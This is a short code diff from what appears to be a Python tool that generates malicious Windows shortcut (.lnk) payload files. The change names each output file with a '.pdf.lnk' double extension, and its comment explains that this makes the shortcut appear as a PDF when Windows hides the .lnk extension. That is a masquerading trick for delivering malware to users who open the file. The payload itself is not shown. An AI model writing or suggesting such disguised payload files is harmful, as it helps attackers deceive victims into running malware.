@@ -415,7 +415,8 @@ if __name__ == "__main__":
     os.makedirs(payloadname, exist_ok=True)
 
     # Write file - fix: create directly in payloadname folder
-    lnk = os.path.join(payloadname, payloadname) + ".lnk"
+    # Add .pdf to the name so it appears as a PDF when .lnk extension is hidden
+    lnk = os.path.join(payloadname, payloadname) + ".pdf.lnk"
     with open(lnk, 'wb') as f:
         f.write(s)
     f.close
